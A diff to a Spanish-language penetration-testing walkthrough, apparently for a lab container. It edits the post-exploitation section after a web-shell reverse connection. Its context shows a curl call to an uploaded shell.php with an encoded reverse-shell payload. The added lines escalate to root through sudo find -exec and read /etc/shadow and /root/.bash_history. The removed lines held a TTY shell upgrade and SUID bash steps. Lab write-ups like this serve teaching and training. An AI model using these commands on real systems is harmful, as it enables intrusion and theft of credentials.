@@ -213,16 +213,7 @@ curl "http://localhost/avatars/shell.php?cmd=cGhwIC1yICckcz1mc29ja29wZW4oIjE3Mi4
 ```
 > La conexión llega al listener — shell muda sin prompt
 
-Mejorar la shell (en Terminal 1):
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-```
-Pulsa `Ctrl+Z`, luego:
-```bash
-stty raw -echo; fg
-```
-Pulsa Enter dos veces.
-> `www-data@contenedor:/var/www/html$` — shell interactiva completa
+> Llega la conexión — shell limitada sin prompt. Suficiente para ejecutar comandos.
 
 ---
 
@@ -234,27 +225,10 @@ sudo -l
 ```
 > `(root) NOPASSWD: /usr/bin/find`
 
-Opción A — GTFOBins con sudo find:
+GTFOBins con sudo find (sin TTY):
 ```bash
-sudo find . -exec /bin/bash \; -quit
+sudo find . -exec /bin/bash -c 'whoami' \; -quit
+sudo find . -exec /bin/bash -c 'cat /etc/shadow' \; -quit
+sudo find . -exec /bin/bash -c 'cat /root/.bash_history' \; -quit
 ```
-```bash
-whoami
-```
-> `root`
-
-Opción B — SUID bash:
-```bash
-/tmp/rootbash -p
-whoami
-```
-> `root`
-
-Explorar como root:
-```bash
-id
-cat /etc/shadow
-ls -la /root
-cat /root/.bash_history
-```
-> `uid=0(root) gid=0(root)` — control total del contenedor
+> `root` — `uid=0(root) gid=0(root)` — control total del contenedor
